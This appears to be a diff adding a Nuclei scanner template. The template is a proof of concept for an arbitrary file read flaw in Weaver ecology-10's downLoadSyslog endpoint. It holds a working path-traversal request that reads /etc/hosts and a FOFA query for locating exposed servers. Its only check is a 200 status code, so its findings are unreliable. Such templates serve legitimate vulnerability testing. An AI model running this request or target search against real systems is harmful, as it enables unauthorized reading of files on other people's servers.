@@ -1,0 +1,29 @@
+id: poc-xggu1lnzige5ngff
+info:
+  name: 泛微-ecology-10 downLoadSyslog 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xggu1lnzige5ngff'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xggu1lnzige5ngff
+    fofa: body="/build/passport/static/js/lib.js" || body="/build/ecodesdk/static/js/lib.js"||icon_hash="-1619753057"
+http:
+- raw:
+  - 'GET /papi/em/transform/downLoadSyslog?logPath=../../.././.././././../../etc/hosts HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
